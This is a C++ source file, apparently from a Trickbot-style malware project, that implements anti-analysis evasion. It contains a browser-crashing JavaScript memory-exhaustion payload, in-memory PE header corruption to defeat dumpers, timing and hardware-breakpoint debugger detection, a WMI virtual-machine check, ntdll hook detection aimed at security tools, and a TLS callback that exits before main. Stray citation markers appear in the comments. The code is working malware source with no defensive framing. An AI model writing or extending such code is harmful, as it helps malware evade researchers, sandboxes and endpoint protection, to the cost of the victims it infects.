/**
 * trick_antidebug.cpp - Trickbot Anti-Debugging Techniques
 * Implements the infamous "browser crash" protection [citation:3][citation:7]
 */
#include "trick_config.h"
#include <oleauto.h>
#include <Wbemidl.h>
#include <stdlib.h>
#include <string.h>

static DWORD Adler32Buffer(const BYTE* data, DWORD length) {
    DWORD s1 = 1;
    DWORD s2 = 0;
    for (DWORD i = 0; i < length; i++) {
        s1 = (s1 + data[i]) % 65521u;
        s2 = (s2 + s1) % 65521u;
    }
    return (s2 << 16) | s1;
}

/**
 * JavaScript Anti-Debugging Injection
 * Trickbot detects when researchers beautify injected JS and crashes the browser [citation:3]
 */
const char* GetAntiDebugScript() {
    static const char* script = 
        "var _0xdetect = function() {"
        "    var _0xbeautify = /\\\\s*\\\\n\\\\s*/g;"
        "    var _0xcheck = function(_0xsrc) {"
        "        if (_0xbeautify.test(_0xsrc)) {"
        "            var _0xarr = [];"
        "            while(1) {"
        "                _0xarr.push(new Array(1000000).join('x'));"
        "            }"
        "        }"
        "    };"
        "    _0xcheck(arguments.callee.toString());"
        "};"
        "_0xdetect();";
    return script;
}

/**
 * PE Header Corruption
 * Trickbot corrupts PE headers in memory to confuse dumpers
 */
void CorruptPEHeader() {
    HMODULE hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDos->e_lfanew);
    
    DWORD oldProtect;
    VirtualProtect(pNt, sizeof(IMAGE_NT_HEADERS), PAGE_READWRITE, &oldProtect);
    
    // Zero out section headers
    memset(IMAGE_FIRST_SECTION(pNt), 0, 
           pNt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    pNt->FileHeader.NumberOfSections = 0;
    
    VirtualProtect(pNt, sizeof(IMAGE_NT_HEADERS), oldProtect, &oldProtect);
}

/**
 * Timing-Based Anti-Debug
 * Uses RDTSC to detect single-stepping
 */
BOOL IsBeingDebugged_Timing() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Execute some benign instructions
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
    
    QueryPerformanceCounter(&end);
    LONGLONG elapsed = (end.QuadPart - start.QuadPart) * 1000000 / freq.QuadPart;
    
    // Single-stepping causes huge timing discrepancies
    return (elapsed > 1000);  // > 1ms indicates debugger
}

/**
 * Hardware Breakpoint Detection
 * Checks DR0-DR7 registers for hardware breakpoints
 */
BOOL HasHardwareBreakpoints() {
    CONTEXT ctx = {};
    HANDLE hThread = GetCurrentThread();
    
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);
    
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

/**
 * Anti-VM WMI Query
 * Checks for VMware/VirtualBox via WMI
 */
BOOL IsVirtualMachine() {
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnum = NULL;
    IWbemClassObject* pObj = NULL;
    HRESULT hr;
    BOOL comInitialized = FALSE;
    BOOL result = FALSE;
    BSTR namespaceName = NULL;
    BSTR queryLanguage = NULL;
    BSTR query = NULL;
    ULONG uReturn = 0;
    
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        comInitialized = TRUE;
    } else if (hr == RPC_E_CHANGED_MODE) {
        comInitialized = FALSE;
    } else {
        return FALSE;
    }
    
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr) || !pLoc) goto cleanup;
    
    namespaceName = SysAllocString(L"ROOT\\CIMV2");
    queryLanguage = SysAllocString(L"WQL");
    query = SysAllocString(L"SELECT * FROM Win32_ComputerSystem WHERE Model LIKE '%VMware%' OR Model LIKE '%VirtualBox%'");
    if (!namespaceName || !queryLanguage || !query) goto cleanup;

    hr = pLoc->ConnectServer(namespaceName, NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr) || !pSvc) goto cleanup;

    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      NULL, EOAC_NONE);
    
    hr = pSvc->ExecQuery(queryLanguage, query,
                         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                         NULL, &pEnum);
    if (FAILED(hr) || !pEnum) goto cleanup;

    pEnum->Next(WBEM_INFINITE, 1, &pObj, &uReturn);
    
    result = (uReturn > 0);
    
cleanup:
    if (query) SysFreeString(query);
    if (queryLanguage) SysFreeString(queryLanguage);
    if (namespaceName) SysFreeString(namespaceName);
    if (pObj) pObj->Release();
    if (pEnum) pEnum->Release();
    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    if (comInitialized) CoUninitialize();
    
    return result;
}

/**
 * Inline-hook detection by comparing the on-disk ntdll .text section to the
 * in-memory mapped copy. This mirrors TrickBot's anti-hook posture without
 * shipping any actual syscall unhooking routine.
 */
BOOL DetectNtdllHooks() {
    char ntdllPath[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'n','t','d','l','l','.','d','l','l','\0'
    };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BYTE* diskBuffer = NULL;
    DWORD fileSize = 0;
    DWORD bytesRead = 0;
    BOOL hooked = FALSE;

    hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize < sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(hFile);
        return FALSE;
    }

    diskBuffer = (BYTE*)malloc(fileSize);
    if (!diskBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    if (!ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        free(diskBuffer);
        return FALSE;
    }
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)diskBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        free(diskBuffer);
        return FALSE;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(diskBuffer + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        free(diskBuffer);
        return FALSE;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        free(diskBuffer);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (memcmp(section->Name, ".text", 5) == 0) {
            DWORD hashLength = section->SizeOfRawData;
            if (section->Misc.VirtualSize && section->Misc.VirtualSize < hashLength) {
                hashLength = section->Misc.VirtualSize;
            }

            DWORD diskHash = Adler32Buffer(diskBuffer + section->PointerToRawData, hashLength);
            DWORD memoryHash = Adler32Buffer((const BYTE*)hNtdll + section->VirtualAddress, hashLength);
            hooked = (diskHash != memoryHash);
            break;
        }
    }

    free(diskBuffer);
    return hooked;
}

/**
 * TLS Callback Anti-Debug
 * Executes before main entry point
 */
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        if (IsBeingDebugged_Timing() || HasHardwareBreakpoints() || DetectNtdllHooks()) {
            #ifdef _MSC_VER
            // Corrupt stack and crash gracefully
            __try {
                *(volatile int*)0 = 0;
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                ExitProcess(0);
            }
            #else
            ExitProcess(0);
            #endif
        }
    }
}

// Register TLS callback
#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback = TlsCallback;
#pragma const_seg()
#endif
